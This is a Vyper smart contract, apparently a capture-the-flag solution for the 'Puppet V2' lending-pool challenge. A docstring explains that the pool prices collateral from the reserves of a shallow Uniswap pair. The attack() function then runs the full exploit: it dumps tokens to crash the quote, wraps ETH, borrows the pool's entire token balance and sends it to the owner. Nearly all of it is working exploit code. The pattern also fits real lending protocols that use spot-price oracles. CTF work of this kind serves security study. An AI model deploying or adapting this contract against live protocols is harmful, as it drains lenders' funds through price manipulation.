# @version ^0.3.7

"""
The vulnerability is that the `_getOracleQuote()` function
in the PuppetV2Pool contract relies on the reserves of the 
pair contract to calculate the quote. The pair contract has
initial balances of 100 tokens and 10 weth. The liquidity is 
not deep at all. Therefore we can easily manipulate the reserves
and ultimately manipulate the computed oracle quote. An attacker 
can swap all of ther 10000 tokens for ETH. Now the `_getOracleQuote()`
will compute a drastically lower oracle quote. The attacker can then 
use all of the ETH he has to now borrow the entire balance of the
lending pool.
"""

from vyper.interfaces import ERC20 as IERC20

interface IUniswapV2Router:
    def swapExactTokensForETH(
        amountIn: uint256,
        amountOutMin: uint256,
        path: DynArray[address, 2],
        to: address,
        deadline: uint256,
    ) -> DynArray[uint256, 2]: nonpayable

interface IPool:
    def calculateDepositOfWETHRequired(
        tokenAmount: uint256        
    ) -> uint256: view
    def borrow(borrowAmount: uint256): nonpayable

owner: immutable(address)

token: IERC20
router: IUniswapV2Router
pool: IPool

weth: address

@external
@payable
def __init__(
    _token: IERC20, 
    _router: IUniswapV2Router, 
    _pool: IPool,
    _weth: address, 
):
    assert msg.value > as_wei_value(19, "ether"), "send ETH"
    owner = msg.sender
    self.token = _token
    self.router = _router
    self.pool = _pool
    self.weth = _weth

@external
def attack():
    assert msg.sender == owner, "!owner"
    deadline: uint256 = block.timestamp * 2
    initial_balance: uint256 = self.token.balanceOf(self)
    pool_balance: uint256 = self.token.balanceOf(self.pool.address)
    path: DynArray[address, 2] = [self.token.address, self.weth]
    
    self.token.approve(self.router.address, initial_balance)

    self.router.swapExactTokensForETH(
        initial_balance,
        empty(uint256),
        path,
        self,
        deadline,
    )
    self._borrow_from_pool(pool_balance)

    self.token.transfer(
        msg.sender, 
        self.token.balanceOf(self),
    )
    send(msg.sender, self.balance)
    
@internal
def _borrow_from_pool(tokens_to_swap: uint256):
    required_eth: uint256 = self.pool.calculateDepositOfWETHRequired(
        tokens_to_swap
    )
    assert self.balance >= required_eth, "need more eth"
    IERC20(self.weth).approve(self.pool.address, required_eth)
    raw_call(self.weth, b"", value=required_eth)
    self.pool.borrow(tokens_to_swap)

@external
@payable
def __default__():
    pass
